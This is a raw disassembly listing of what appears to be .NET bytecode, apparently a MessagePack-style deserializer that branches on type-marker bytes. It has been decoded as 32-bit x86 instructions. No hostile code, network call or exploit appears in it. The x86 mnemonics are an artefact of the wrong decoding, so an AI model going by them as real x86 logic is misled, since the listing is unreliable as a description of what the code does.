  40364a:	3c 00                	cmp    $0x0,%al
  40364c:	00 06                	add    %al,(%esi)
  40364e:	0b 07                	or     (%edi),%eax
  403650:	2d 10 06 6f 3d       	sub    $0x3d6f0610,%eax
  403655:	00 00                	add    %al,(%eax)
  403657:	06                   	push   %es
  403658:	0a 06                	or     (%esi),%al
  40365a:	09 6f 38             	or     %ebp,0x38(%edi)
  40365d:	00 00                	add    %al,(%eax)
  40365f:	06                   	push   %es
  403660:	2b 02                	sub    (%edx),%eax
  403662:	07                   	pop    %es
  403663:	0a 11                	or     (%ecx),%dl
  403665:	05 17 58 13 05       	add    $0x5135817,%eax
  40366a:	11 05 08 8e 69 17    	adc    %eax,0x17698e08
  403670:	59                   	pop    %ecx
  403671:	32 cf                	xor    %bh,%cl
  403673:	08 08                	or     %cl,(%eax)
  403675:	8e 69 17             	mov    0x17(%ecx),%gs
  403678:	59                   	pop    %ecx
  403679:	9a 0d 06 09 6f 3b 00 	lcall  $0x3b,$0x6f09060d
  403680:	00 06                	add    %al,(%esi)
  403682:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403685:	04 15                	add    $0x15,%al
  403687:	31 0e                	xor    %ecx,(%esi)
  403689:	06                   	push   %es
  40368a:	7b 26                	jnp    0x4036b2
  40368c:	00 00                	add    %al,(%eax)
  40368e:	04 11                	add    $0x11,%al
  403690:	04 6f                	add    $0x6f,%al
  403692:	59                   	pop    %ecx
  403693:	00 00                	add    %al,(%eax)
  403695:	0a 2a                	or     (%edx),%ch
  403697:	06                   	push   %es
  403698:	6f                   	outsl  %ds:(%esi),(%dx)
  403699:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  40369e:	06                   	push   %es
  40369f:	09 6f 38             	or     %ebp,0x38(%edi)
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	06                   	push   %es
  4036a5:	06                   	push   %es
  4036a6:	2a 00                	sub    (%eax),%al
  4036a8:	1b 30                	sbb    (%eax),%esi
  4036aa:	04 00                	add    $0x0,%al
  4036ac:	35 00 00 00 0f       	xor    $0xf000000,%eax
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	11 73 79             	adc    %esi,0x79(%ebx)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	0a 0a                	or     (%edx),%cl
  4036ba:	03 28                	add    (%eax),%ebp
  4036bc:	a0 00 00 06 10       	mov    0x10060000,%al
  4036c1:	01 06                	add    %eax,(%esi)
  4036c3:	03 16                	add    (%esi),%edx
  4036c5:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4036cb:	00 0a                	add    %cl,(%edx)
  4036cd:	06                   	push   %es
  4036ce:	16                   	push   %ss
  4036cf:	6a 6f                	push   $0x6f
  4036d1:	4e                   	dec    %esi
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	0a 02                	or     (%edx),%al
  4036d6:	06                   	push   %es
  4036d7:	28 56 00             	sub    %dl,0x0(%esi)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	de 0a                	fimuls (%edx)
  4036de:	06                   	push   %es
  4036df:	2c 06                	sub    $0x6,%al
  4036e1:	06                   	push   %es
  4036e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e3:	33 00                	xor    (%eax),%eax
  4036e5:	00 0a                	add    %cl,(%edx)
  4036e7:	dc 2a                	fsubrl (%edx)
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	00 01                	add    %al,(%ecx)
  4036ed:	10 00                	adc    %al,(%eax)
  4036ef:	00 02                	add    %al,(%edx)
  4036f1:	00 06                	add    %al,(%esi)
  4036f3:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  4036f6:	00 0a                	add    %cl,(%edx)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	02 00                	add    (%eax),%al
  403700:	16                   	push   %ss
  403701:	00 00                	add    %al,(%eax)
  403703:	00 10                	add    %dl,(%eax)
  403705:	00 00                	add    %al,(%eax)
  403707:	11 03                	adc    %eax,(%ebx)
  403709:	19 73 77             	sbb    %esi,0x77(%ebx)
  40370c:	00 00                	add    %al,(%eax)
  40370e:	0a 0a                	or     (%edx),%cl
  403710:	02 06                	add    (%esi),%al
  403712:	28 56 00             	sub    %dl,0x0(%esi)
  403715:	00 06                	add    %al,(%esi)
  403717:	06                   	push   %es
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	41                   	inc    %ecx
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 2a                	or     (%edx),%ch
  40371e:	00 00                	add    %al,(%eax)
  403720:	13 30                	adc    (%eax),%esi
  403722:	04 00                	add    $0x0,%al
  403724:	83 05 00 00 0a 00 00 	addl   $0x0,0xa0000
  40372b:	11 03                	adc    %eax,(%ebx)
  40372d:	6f                   	outsl  %ds:(%esi),(%dx)
  40372e:	7a 00                	jp     0x403730
  403730:	00 0a                	add    %cl,(%edx)
  403732:	d2 0a                	rorb   %cl,(%edx)
  403734:	14 0b                	adc    $0xb,%al
  403736:	16                   	push   %ss
  403737:	0c 16                	or     $0x16,%al
  403739:	0d 06 1f 7f 30       	or     $0x307f1f06,%eax
  40373e:	09 02                	or     %eax,(%edx)
  403740:	06                   	push   %es
  403741:	6e                   	outsb  %ds:(%esi),(%dx)
  403742:	28 42 00             	sub    %al,0x0(%edx)
  403745:	00 06                	add    %al,(%esi)
  403747:	2a 06                	sub    (%esi),%al
  403749:	20 80 00 00 00 32    	and    %al,0x32000000(%eax)
  40374f:	42                   	inc    %edx
  403750:	06                   	push   %es
  403751:	20 8f 00 00 00 30    	and    %cl,0x30000000(%edi)
  403757:	3a 02                	cmp    (%edx),%al
  403759:	28 39                	sub    %bh,(%ecx)
  40375b:	00 00                	add    %al,(%eax)
  40375d:	06                   	push   %es
  40375e:	02 18                	add    (%eax),%bl
  403760:	7d 24                	jge    0x403786
  403762:	00 00                	add    %al,(%eax)
  403764:	04 06                	add    $0x6,%al
  403766:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  40376c:	0c 16                	or     $0x16,%al
  40376e:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403773:	3a 00                	cmp    (%eax),%al
  403775:	00 06                	add    %al,(%esi)
  403777:	25 03 28 64 00       	and    $0x642803,%eax
  40377c:	00 06                	add    %al,(%esi)
  40377e:	6f                   	outsl  %ds:(%esi),(%dx)
  40377f:	38 00                	cmp    %al,(%eax)
  403781:	00 06                	add    %al,(%esi)
  403783:	03 6f 56             	add    0x56(%edi),%ebp
  403786:	00 00                	add    %al,(%eax)
  403788:	06                   	push   %es
  403789:	09 17                	or     %edx,(%edi)
  40378b:	58                   	pop    %eax
  40378c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403791:	2a 06                	sub    (%esi),%al
  403793:	20 90 00 00 00 32    	and    %dl,0x32000000(%eax)
  403799:	36 06                	ss push %es
  40379b:	20 9f 00 00 00 30    	and    %bl,0x30000000(%edi)
  4037a1:	2e 02 28             	add    %cs:(%eax),%ch
  4037a4:	39 00                	cmp    %eax,(%eax)
  4037a6:	00 06                	add    %al,(%esi)
  4037a8:	02 19                	add    (%ecx),%bl
  4037aa:	7d 24                	jge    0x4037d0
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	04 06                	add    $0x6,%al
  4037b0:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  4037b6:	0c 16                	or     $0x16,%al
  4037b8:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  4037bd:	3a 00                	cmp    (%eax),%al
  4037bf:	00 06                	add    %al,(%esi)
  4037c1:	03 6f 56             	add    0x56(%edi),%ebp
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	06                   	push   %es
  4037c7:	09 17                	or     %edx,(%edi)
  4037c9:	58                   	pop    %eax
  4037ca:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4037cf:	2a 06                	sub    (%esi),%al
  4037d1:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  4037d7:	1e                   	push   %ds
  4037d8:	06                   	push   %es
  4037d9:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  4037df:	16                   	push   %ss
  4037e0:	06                   	push   %es
  4037e1:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  4037e7:	0c 02                	or     $0x2,%al
  4037e9:	03 08                	add    (%eax),%ecx
  4037eb:	28 63 00             	sub    %ah,0x0(%ebx)
  4037ee:	00 06                	add    %al,(%esi)
  4037f0:	28 4f 00             	sub    %cl,0x0(%edi)
  4037f3:	00 06                	add    %al,(%esi)
  4037f5:	2a 06                	sub    (%esi),%al
  4037f7:	20 e0                	and    %ah,%al
  4037f9:	00 00                	add    %al,(%eax)
  4037fb:	00 32                	add    %dh,(%edx)
  4037fd:	12 06                	adc    (%esi),%al
  4037ff:	20 ff                	and    %bh,%bh
  403801:	00 00                	add    %al,(%eax)
  403803:	00 30                	add    %dh,(%eax)
  403805:	0a 02                	or     (%edx),%al
  403807:	06                   	push   %es
  403808:	67 6a 28             	addr16 push $0x28
  40380b:	42                   	inc    %edx
  40380c:	00 00                	add    %al,(%eax)
  40380e:	06                   	push   %es
  40380f:	2a 06                	sub    (%esi),%al
  403811:	20 c0                	and    %al,%al
  403813:	00 00                	add    %al,(%eax)
  403815:	00 33                	add    %dh,(%ebx)
  403817:	07                   	pop    %es
  403818:	02 28                	add    (%eax),%ch
  40381a:	4e                   	dec    %esi
  40381b:	00 00                	add    %al,(%eax)
  40381d:	06                   	push   %es
  40381e:	2a 06                	sub    (%esi),%al
  403820:	20 c1                	and    %al,%cl
  403822:	00 00                	add    %al,(%eax)
  403824:	00 33                	add    %dh,(%ebx)
  403826:	0b 72 db             	or     -0x25(%edx),%esi
  403829:	20 00                	and    %al,(%eax)
  40382b:	70 73                	jo     0x4038a0
  40382d:	7b 00                	jnp    0x40382f
  40382f:	00 0a                	add    %cl,(%edx)
  403831:	7a 06                	jp     0x403839
  403833:	20 c2                	and    %al,%dl
  403835:	00 00                	add    %al,(%eax)
  403837:	00 33                	add    %dh,(%ebx)
  403839:	08 02                	or     %al,(%edx)
  40383b:	16                   	push   %ss
  40383c:	28 51 00             	sub    %dl,0x0(%ecx)
  40383f:	00 06                	add    %al,(%esi)
  403841:	2a 06                	sub    (%esi),%al
  403843:	20 c3                	and    %al,%bl
  403845:	00 00                	add    %al,(%eax)
  403847:	00 33                	add    %dh,(%ebx)
  403849:	08 02                	or     %al,(%edx)
  40384b:	17                   	pop    %ss
  40384c:	28 51 00             	sub    %dl,0x0(%ecx)
  40384f:	00 06                	add    %al,(%esi)
  403851:	2a 06                	sub    (%esi),%al
  403853:	20 c4                	and    %al,%ah
  403855:	00 00                	add    %al,(%eax)
  403857:	00 33                	add    %dh,(%ebx)
  403859:	20 03                	and    %al,(%ebx)
  40385b:	6f                   	outsl  %ds:(%esi),(%dx)
  40385c:	7a 00                	jp     0x40385e
  40385e:	00 0a                	add    %cl,(%edx)
  403860:	0c 08                	or     $0x8,%al
  403862:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403866:	01 0b                	add    %ecx,(%ebx)
  403868:	03 07                	add    (%edi),%eax
  40386a:	16                   	push   %ss
  40386b:	08 6f 45             	or     %ch,0x45(%edi)
  40386e:	00 00                	add    %al,(%eax)
  403870:	0a 26                	or     (%esi),%ah
  403872:	02 07                	add    (%edi),%al
  403874:	28 47 00             	sub    %al,0x0(%edi)
  403877:	00 06                	add    %al,(%esi)
  403879:	2a 06                	sub    (%esi),%al
  40387b:	20 c5                	and    %al,%ch
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 33                	add    %dh,(%ebx)
  403881:	39 18                	cmp    %ebx,(%eax)
  403883:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403887:	01 0b                	add    %ecx,(%ebx)
  403889:	03 07                	add    (%edi),%eax
  40388b:	16                   	push   %ss
  40388c:	18 6f 45             	sbb    %ch,0x45(%edi)
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 26                	or     (%esi),%ah
  403893:	07                   	pop    %es
  403894:	28 26                	sub    %ah,(%esi)
  403896:	00 00                	add    %al,(%eax)
  403898:	06                   	push   %es
  403899:	0b 07                	or     (%edi),%eax
  40389b:	16                   	push   %ss
  40389c:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4038a0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038a3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038a7:	01 0b                	add    %ecx,(%ebx)
  4038a9:	03 07                	add    (%edi),%eax
  4038ab:	16                   	push   %ss
  4038ac:	08 6f 45             	or     %ch,0x45(%edi)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 26                	or     (%esi),%ah
  4038b3:	02 07                	add    (%edi),%al
  4038b5:	28 47 00             	sub    %al,0x0(%edi)
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	2a 06                	sub    (%esi),%al
  4038bc:	20 c6                	and    %al,%dh
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	00 33                	add    %dh,(%ebx)
  4038c2:	39 1a                	cmp    %ebx,(%edx)
  4038c4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038c8:	01 0b                	add    %ecx,(%ebx)
  4038ca:	03 07                	add    (%edi),%eax
  4038cc:	16                   	push   %ss
  4038cd:	1a 6f 45             	sbb    0x45(%edi),%ch
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 26                	or     (%esi),%ah
  4038d4:	07                   	pop    %es
  4038d5:	28 26                	sub    %ah,(%esi)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	06                   	push   %es
  4038da:	0b 07                	or     (%edi),%eax
  4038dc:	16                   	push   %ss
  4038dd:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4038e1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038e4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038e8:	01 0b                	add    %ecx,(%ebx)
  4038ea:	03 07                	add    (%edi),%eax
  4038ec:	16                   	push   %ss
  4038ed:	08 6f 45             	or     %ch,0x45(%edi)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	0a 26                	or     (%esi),%ah
  4038f4:	02 07                	add    (%edi),%al
  4038f6:	28 47 00             	sub    %al,0x0(%edi)
  4038f9:	00 06                	add    %al,(%esi)
  4038fb:	2a 06                	sub    (%esi),%al
  4038fd:	20 c7                	and    %al,%bh
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 2e                	add    %ch,(%esi)
  403903:	10 06                	adc    %al,(%esi)
  403905:	20 c8                	and    %cl,%al
  403907:	00 00                	add    %al,(%eax)
  403909:	00 2e                	add    %ch,(%esi)
  40390b:	08 06                	or     %al,(%esi)
  40390d:	20 c9                	and    %cl,%cl
  40390f:	00 00                	add    %al,(%eax)
  403911:	00 33                	add    %dh,(%ebx)
  403913:	0b 72 07             	or     0x7(%edx),%esi
  403916:	21 00                	and    %eax,(%eax)
  403918:	70 73                	jo     0x40398d
  40391a:	7b 00                	jnp    0x40391c
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	7a 06                	jp     0x403926
  403920:	20 ca                	and    %cl,%dl
  403922:	00 00                	add    %al,(%eax)
  403924:	00 33                	add    %dh,(%ebx)
  403926:	26 1a 8d 44 00 00 01 	sbb    %es:0x1000044(%ebp),%cl
  40392d:	0b 03                	or     (%ebx),%eax
  40392f:	07                   	pop    %es
  403930:	16                   	push   %ss
  403931:	1a 6f 45             	sbb    0x45(%edi),%ch
  403934:	00 00                	add    %al,(%eax)
  403936:	0a 26                	or     (%esi),%ah
  403938:	07                   	pop    %es
  403939:	28 26                	sub    %ah,(%esi)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	06                   	push   %es
  40393e:	0b 02                	or     (%edx),%eax
  403940:	07                   	pop    %es
  403941:	16                   	push   %ss
  403942:	28 7d 00             	sub    %bh,0x0(%ebp)
  403945:	00 0a                	add    %cl,(%edx)
  403947:	28 52 00             	sub    %dl,0x0(%edx)
  40394a:	00 06                	add    %al,(%esi)
  40394c:	2a 06                	sub    (%esi),%al
  40394e:	20 cb                	and    %cl,%bl
  403950:	00 00                	add    %al,(%eax)
  403952:	00 33                	add    %dh,(%ebx)
  403954:	26 1e                	es push %ds
  403956:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40395a:	01 0b                	add    %ecx,(%ebx)
  40395c:	03 07                	add    (%edi),%eax
  40395e:	16                   	push   %ss
  40395f:	1e                   	push   %ds
  403960:	6f                   	outsl  %ds:(%esi),(%dx)
  403961:	45                   	inc    %ebp
  403962:	00 00                	add    %al,(%eax)
  403964:	0a 26                	or     (%esi),%ah
  403966:	07                   	pop    %es
  403967:	28 26                	sub    %ah,(%esi)
  403969:	00 00                	add    %al,(%eax)
  40396b:	06                   	push   %es
  40396c:	0b 02                	or     (%edx),%eax
  40396e:	07                   	pop    %es
  40396f:	16                   	push   %ss
  403970:	28 7e 00             	sub    %bh,0x0(%esi)
  403973:	00 0a                	add    %cl,(%edx)
  403975:	28 53 00             	sub    %dl,0x0(%ebx)
  403978:	00 06                	add    %al,(%esi)
  40397a:	2a 06                	sub    (%esi),%al
  40397c:	20 cc                	and    %cl,%ah
  40397e:	00 00                	add    %al,(%eax)
  403980:	00 33                	add    %dh,(%ebx)
  403982:	11 03                	adc    %eax,(%ebx)
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	7a 00                	jp     0x403987
  403987:	00 0a                	add    %cl,(%edx)
  403989:	d2 0a                	rorb   %cl,(%edx)
  40398b:	02 06                	add    (%esi),%al
  40398d:	6e                   	outsb  %ds:(%esi),(%dx)
  40398e:	28 42 00             	sub    %al,0x0(%edx)
  403991:	00 06                	add    %al,(%esi)
  403993:	2a 06                	sub    (%esi),%al
  403995:	20 cd                	and    %cl,%ch
  403997:	00 00                	add    %al,(%eax)
  403999:	00 33                	add    %dh,(%ebx)
  40399b:	27                   	daa
  40399c:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  4039a2:	0b 03                	or     (%ebx),%eax
  4039a4:	07                   	pop    %es
  4039a5:	16                   	push   %ss
  4039a6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	0a 26                	or     (%esi),%ah
  4039ad:	07                   	pop    %es
  4039ae:	28 26                	sub    %ah,(%esi)
  4039b0:	00 00                	add    %al,(%eax)
  4039b2:	06                   	push   %es
  4039b3:	0b 02                	or     (%edx),%eax
  4039b5:	07                   	pop    %es
  4039b6:	16                   	push   %ss
  4039b7:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4039bb:	0a 6e 28             	or     0x28(%esi),%ch
  4039be:	42                   	inc    %edx
  4039bf:	00 00                	add    %al,(%eax)
  4039c1:	06                   	push   %es
  4039c2:	2a 06                	sub    (%esi),%al
  4039c4:	20 ce                	and    %cl,%dh
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	00 33                	add    %dh,(%ebx)
  4039ca:	27                   	daa
  4039cb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4039d1:	0b 03                	or     (%ebx),%eax
  4039d3:	07                   	pop    %es
  4039d4:	16                   	push   %ss
  4039d5:	1a 6f 45             	sbb    0x45(%edi),%ch
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	0a 26                	or     (%esi),%ah
  4039dc:	07                   	pop    %es
  4039dd:	28 26                	sub    %ah,(%esi)
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	06                   	push   %es
  4039e2:	0b 02                	or     (%edx),%eax
  4039e4:	07                   	pop    %es
  4039e5:	16                   	push   %ss
  4039e6:	28 7f 00             	sub    %bh,0x0(%edi)
  4039e9:	00 0a                	add    %cl,(%edx)
  4039eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ec:	28 42 00             	sub    %al,0x0(%edx)
  4039ef:	00 06                	add    %al,(%esi)
  4039f1:	2a 06                	sub    (%esi),%al
  4039f3:	20 cf                	and    %cl,%bh
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	00 33                	add    %dh,(%ebx)
  4039f9:	26 1e                	es push %ds
  4039fb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4039ff:	01 0b                	add    %ecx,(%ebx)
  403a01:	03 07                	add    (%edi),%eax
  403a03:	16                   	push   %ss
  403a04:	1e                   	push   %ds
  403a05:	6f                   	outsl  %ds:(%esi),(%dx)
  403a06:	45                   	inc    %ebp
  403a07:	00 00                	add    %al,(%eax)
  403a09:	0a 26                	or     (%esi),%ah
  403a0b:	07                   	pop    %es
  403a0c:	28 26                	sub    %ah,(%esi)
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	06                   	push   %es
  403a11:	0b 02                	or     (%edx),%eax
  403a13:	07                   	pop    %es
  403a14:	16                   	push   %ss
  403a15:	28 80 00 00 0a 28    	sub    %al,0x280a0000(%eax)
  403a1b:	43                   	inc    %ebx
  403a1c:	00 00                	add    %al,(%eax)
  403a1e:	06                   	push   %es
  403a1f:	2a 06                	sub    (%esi),%al
  403a21:	20 dc                	and    %bl,%ah
  403a23:	00 00                	add    %al,(%eax)
  403a25:	00 33                	add    %dh,(%ebx)
  403a27:	46                   	inc    %esi
  403a28:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403a2e:	0b 03                	or     (%ebx),%eax
  403a30:	07                   	pop    %es
  403a31:	16                   	push   %ss
  403a32:	18 6f 45             	sbb    %ch,0x45(%edi)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 26                	or     (%esi),%ah
  403a39:	07                   	pop    %es
  403a3a:	28 26                	sub    %ah,(%esi)
  403a3c:	00 00                	add    %al,(%eax)
  403a3e:	06                   	push   %es
  403a3f:	0b 07                	or     (%edi),%eax
  403a41:	16                   	push   %ss
  403a42:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a48:	02 28                	add    (%eax),%ch
  403a4a:	39 00                	cmp    %eax,(%eax)
  403a4c:	00 06                	add    %al,(%esi)
  403a4e:	02 19                	add    (%ecx),%bl
  403a50:	7d 24                	jge    0x403a76
  403a52:	00 00                	add    %al,(%eax)
  403a54:	04 16                	add    $0x16,%al
  403a56:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403a5b:	3a 00                	cmp    (%eax),%al
  403a5d:	00 06                	add    %al,(%esi)
  403a5f:	03 6f 56             	add    0x56(%edi),%ebp
  403a62:	00 00                	add    %al,(%eax)
  403a64:	06                   	push   %es
  403a65:	09 17                	or     %edx,(%edi)
  403a67:	58                   	pop    %eax
  403a68:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403a6d:	2a 06                	sub    (%esi),%al
  403a6f:	20 dd                	and    %bl,%ch
  403a71:	00 00                	add    %al,(%eax)
  403a73:	00 33                	add    %dh,(%ebx)
  403a75:	46                   	inc    %esi
  403a76:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403a7c:	0b 03                	or     (%ebx),%eax
  403a7e:	07                   	pop    %es
  403a7f:	16                   	push   %ss
  403a80:	1a 6f 45             	sbb    0x45(%edi),%ch
  403a83:	00 00                	add    %al,(%eax)
  403a85:	0a 26                	or     (%esi),%ah
  403a87:	07                   	pop    %es
  403a88:	28 26                	sub    %ah,(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	06                   	push   %es
  403a8d:	0b 07                	or     (%edi),%eax
  403a8f:	16                   	push   %ss
  403a90:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a96:	02 28                	add    (%eax),%ch
  403a98:	39 00                	cmp    %eax,(%eax)
  403a9a:	00 06                	add    %al,(%esi)
  403a9c:	02 19                	add    (%ecx),%bl
  403a9e:	7d 24                	jge    0x403ac4
  403aa0:	00 00                	add    %al,(%eax)
  403aa2:	04 16                	add    $0x16,%al
  403aa4:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403aa9:	3a 00                	cmp    (%eax),%al
  403aab:	00 06                	add    %al,(%esi)
  403aad:	03 6f 56             	add    0x56(%edi),%ebp
  403ab0:	00 00                	add    %al,(%eax)
  403ab2:	06                   	push   %es
  403ab3:	09 17                	or     %edx,(%edi)
  403ab5:	58                   	pop    %eax
  403ab6:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403abb:	2a 06                	sub    (%esi),%al
  403abd:	20 d9                	and    %bl,%cl
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	00 33                	add    %dh,(%ebx)
  403ac3:	0e                   	push   %cs
  403ac4:	02 06                	add    (%esi),%al
  403ac6:	03 28                	add    (%eax),%ebp
  403ac8:	65 00 00             	add    %al,%gs:(%eax)
  403acb:	06                   	push   %es
  403acc:	28 4f 00             	sub    %cl,0x0(%edi)
  403acf:	00 06                	add    %al,(%esi)
  403ad1:	2a 06                	sub    (%esi),%al
  403ad3:	20 de                	and    %bl,%dh
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 33                	add    %dh,(%ebx)
  403ad9:	52                   	push   %edx
  403ada:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ae0:	0b 03                	or     (%ebx),%eax
  403ae2:	07                   	pop    %es
  403ae3:	16                   	push   %ss
  403ae4:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ae7:	00 00                	add    %al,(%eax)
  403ae9:	0a 26                	or     (%esi),%ah
  403aeb:	07                   	pop    %es
  403aec:	28 26                	sub    %ah,(%esi)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	06                   	push   %es
  403af1:	0b 07                	or     (%edi),%eax
  403af3:	16                   	push   %ss
  403af4:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403afa:	02 28                	add    (%eax),%ch
  403afc:	39 00                	cmp    %eax,(%eax)
  403afe:	00 06                	add    %al,(%esi)
  403b00:	02 18                	add    (%eax),%bl
  403b02:	7d 24                	jge    0x403b28
  403b04:	00 00                	add    %al,(%eax)
  403b06:	04 16                	add    $0x16,%al
  403b08:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b0d:	3a 00                	cmp    (%eax),%al
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	25 03 28 64 00       	and    $0x642803,%eax
  403b16:	00 06                	add    %al,(%esi)
  403b18:	6f                   	outsl  %ds:(%esi),(%dx)
  403b19:	38 00                	cmp    %al,(%eax)
  403b1b:	00 06                	add    %al,(%esi)
  403b1d:	03 6f 56             	add    0x56(%edi),%ebp
  403b20:	00 00                	add    %al,(%eax)
  403b22:	06                   	push   %es
  403b23:	09 17                	or     %edx,(%edi)
  403b25:	58                   	pop    %eax
  403b26:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b2b:	2a 06                	sub    (%esi),%al
  403b2d:	20 de                	and    %bl,%dh
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	00 33                	add    %dh,(%ebx)
  403b33:	52                   	push   %edx
  403b34:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403b3a:	0b 03                	or     (%ebx),%eax
  403b3c:	07                   	pop    %es
  403b3d:	16                   	push   %ss
  403b3e:	18 6f 45             	sbb    %ch,0x45(%edi)
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a 26                	or     (%esi),%ah
  403b45:	07                   	pop    %es
  403b46:	28 26                	sub    %ah,(%esi)
  403b48:	00 00                	add    %al,(%eax)
  403b4a:	06                   	push   %es
  403b4b:	0b 07                	or     (%edi),%eax
  403b4d:	16                   	push   %ss
  403b4e:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403b54:	02 28                	add    (%eax),%ch
  403b56:	39 00                	cmp    %eax,(%eax)
  403b58:	00 06                	add    %al,(%esi)
  403b5a:	02 18                	add    (%eax),%bl
  403b5c:	7d 24                	jge    0x403b82
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	04 16                	add    $0x16,%al
  403b62:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b67:	3a 00                	cmp    (%eax),%al
  403b69:	00 06                	add    %al,(%esi)
  403b6b:	25 03 28 64 00       	and    $0x642803,%eax
  403b70:	00 06                	add    %al,(%esi)
  403b72:	6f                   	outsl  %ds:(%esi),(%dx)
  403b73:	38 00                	cmp    %al,(%eax)
  403b75:	00 06                	add    %al,(%esi)
  403b77:	03 6f 56             	add    0x56(%edi),%ebp
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	06                   	push   %es
  403b7d:	09 17                	or     %edx,(%edi)
  403b7f:	58                   	pop    %eax
  403b80:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b85:	2a 06                	sub    (%esi),%al
  403b87:	20 df                	and    %bl,%bh
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 33                	add    %dh,(%ebx)
  403b8d:	52                   	push   %edx
  403b8e:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403b94:	0b 03                	or     (%ebx),%eax
  403b96:	07                   	pop    %es
  403b97:	16                   	push   %ss
  403b98:	1a 6f 45             	sbb    0x45(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 26                	or     (%esi),%ah
  403b9f:	07                   	pop    %es
  403ba0:	28 26                	sub    %ah,(%esi)
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	0b 07                	or     (%edi),%eax
  403ba7:	16                   	push   %ss
  403ba8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403bac:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403baf:	28 39                	sub    %bh,(%ecx)
